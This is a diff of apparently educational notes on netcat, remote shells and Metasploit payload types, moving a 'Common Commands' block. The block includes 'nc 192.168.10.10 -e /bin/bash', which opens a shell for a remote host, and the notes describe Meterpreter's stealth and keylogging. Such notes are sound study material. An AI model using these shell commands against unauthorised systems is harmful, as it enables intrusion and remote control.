@@ -161,26 +161,11 @@ After exploiting a system, attackers often aim to get a **shell** on the target 
   1. **Listening on ports** to wait for incoming connections (acting as a server).
   2. **Creating connections** to remote ports (acting as a client).
 
-### Common Commands
-
-```bash
-# Start listening on port 2222 (verbose, listen mode, specify port)
-netcat -lvp 2222
-
-# Connect to target IP 192.168.10.10 and execute /bin/bash to get shell
-nc 192.168.10.10 -e /bin/bash
-
-# Start listener on port 12345 (verbose, listen mode, no DNS resolution, specify port)
-nc -lvnp 12345
-
-* Ports can be any number from 1 to 65535, but commonly high-numbered ports above 1024 are used for such purposes.
-
 # Payloads
 
 * A **payload** is a command or script executed on the target system after exploitation.
 * The payload establishes an actual remote connection, allowing the attacker control over the target.
 * Payloads vary based on:
-
   * Operating system
   * Shell type
   * Connection method (bind or reverse)
@@ -212,17 +197,11 @@ nc -lvnp 12345
 
 Payloads are often structured in the following way:
 
-```
-OS / Shell Type / Connection Type
-```
-
 * **OS**: Windows, Linux, macOS, etc.
 * **Shell Type**:
-
   * **Shell**: Basic command shell.
   * **Meterpreter**: An advanced and dynamically extensible payload providing many features such as file system access, command execution, and network pivoting.
 * **Connection Type**:
-
   * **Bind**: Target listens, attacker connects.
   * **Reverse**: Target connects back to attacker.
 
@@ -233,6 +212,26 @@ OS / Shell Type / Connection Type
 * A powerful Metasploit payload that provides an interactive shell with many additional features.
 * Supports scripting, file uploads/downloads, process migration, keylogging, and more.
 * Runs entirely in memory, making it stealthy and harder to detect.
+
+### Common Commands
+
+```bash
+# Start listening on port 2222 (verbose, listen mode, specify port)
+netcat -lvp 2222
+
+# Connect to target IP 192.168.10.10 and execute /bin/bash to get shell
+nc 192.168.10.10 -e /bin/bash
+
+# Start listener on port 12345 (verbose, listen mode, no DNS resolution, specify port)
+nc -lvnp 12345
+
+* Ports can be any number from 1 to 65535, but commonly high-numbered ports above 1024 are used for such purposes.
+
+
+
+
+
+
 
 
 
